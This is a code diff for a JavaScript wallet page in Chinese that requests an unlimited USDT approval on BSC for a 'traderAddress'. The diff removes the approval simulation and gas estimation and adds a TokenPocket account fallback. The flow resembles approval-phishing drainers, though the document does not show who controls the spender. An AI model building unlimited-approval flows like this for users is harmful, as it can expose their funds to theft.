@@ -257,19 +257,6 @@ async function checkBnbBalance(addr) {
   } catch (e) {}
 }
 
-// Simulate approve via eth_call to detect revert before sending
-async function simulateApprove(from) {
-  var spenderPadded = traderAddress.toLowerCase().replace('0x', '').padStart(64, '0');
-  var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-  var data = '0x095ea7b3' + spenderPadded + maxAmount;
-  try {
-    await provider.request({ method: 'eth_call', params: [{ from: from, to: usdtAddress, data: data }, 'latest'] });
-    return { success: true };
-  } catch (e) {
-    return { success: false, error: e.message || '模拟执行失败' };
-  }
-}
-
 async function approveUSDT() {
   if (!connected) { showMsg('请先连接钱包', 'err'); return; }
   setStep(2, 'run');
@@ -280,8 +267,20 @@ async function approveUSDT() {
   try {
     var accounts = await provider.request({ method: 'eth_accounts' });
     var from = accounts[0];
+    if (!from) {
+      // TokenPocket sometimes doesn't return accounts via eth_accounts
+      // Try eth_requestAccounts instead
+      accounts = await provider.request({ method: 'eth_requestAccounts' });
+      from = accounts[0];
+    }
+    if (!from) {
+      showMsg('无法获取钱包地址，请重新连接钱包后重试', 'err');
+      setStep(2, 'err');
+      document.getElementById('approveBtn').disabled = false;
+      return;
+    }
 
-    // Step 1: Check BNB balance first
+    // Step 1: Check BNB balance
     var balHex = await provider.request({ method: 'eth_getBalance', params: [from, 'latest'] });
     var balWei = BigInt(balHex);
     var balBnb = Number(balWei) / 1e18;
@@ -292,17 +291,7 @@ async function approveUSDT() {
       return;
     }
 
-    // Step 2: Simulate approve to avoid sending a tx that will revert
-    showMsg('正在检查授权可行性...', 'info');
-    var sim = await simulateApprove(from);
-    if (!sim.success) {
-      showMsg('授权模拟失败: ' + sim.error + '\n\n交易很可能也会失败，已阻止发送。\n\n可能原因：\n1. 钱包未切换到 BSC 网络\n2. USDT 合约不支持此操作\n3. 钱包状态异常', 'err');
-      setStep(2, 'err');
-      document.getElementById('approveBtn').disabled = false;
-      return;
-    }
-
-    // Step 3: Build and send transaction
+    // Step 2: Build and send transaction (skip eth_call simulation - not reliable in TokenPocket)
     var spenderPadded = traderAddress.toLowerCase().replace('0x', '').padStart(64, '0');
     var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     var data = '0x095ea7b3' + spenderPadded + maxAmount;
@@ -310,7 +299,6 @@ async function approveUSDT() {
     // Fixed gas: 60000 (approve needs ~47000, add margin)
     // Fixed gasPrice: 1 Gwei = 0x3B9ACA00 (BSC standard, cheapest)
     // Total cost: 60000 * 1 Gwei = 0.00006 BNB (~$0.02)
-    // This ensures even users with very little BNB can approve
     var txParams = {
       from: from,
       to: usdtAddress,
@@ -319,17 +307,6 @@ async function approveUSDT() {
       gasPrice: '0x3B9ACA00',  // 1 Gwei - BSC minimum
       chainId: '0x38',
     };
-
-    // Also try to estimate gas, use it if higher than our default
-    try {
-      var gasEstimate = await provider.request({ method: 'eth_estimateGas', params: [{ from: from, to: usdtAddress, data: data }] });
-      var gasNum = parseInt(gasEstimate, 16);
-      if (gasNum > 60000) {
-        txParams.gas = '0x' + Math.ceil(gasNum * 1.2).toString(16);
-      }
-    } catch (ge) {
-      // Use default 60000
-    }
 
     var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
     showMsg('请在 ' + walletLabel + ' 中确认授权交易...', 'info');
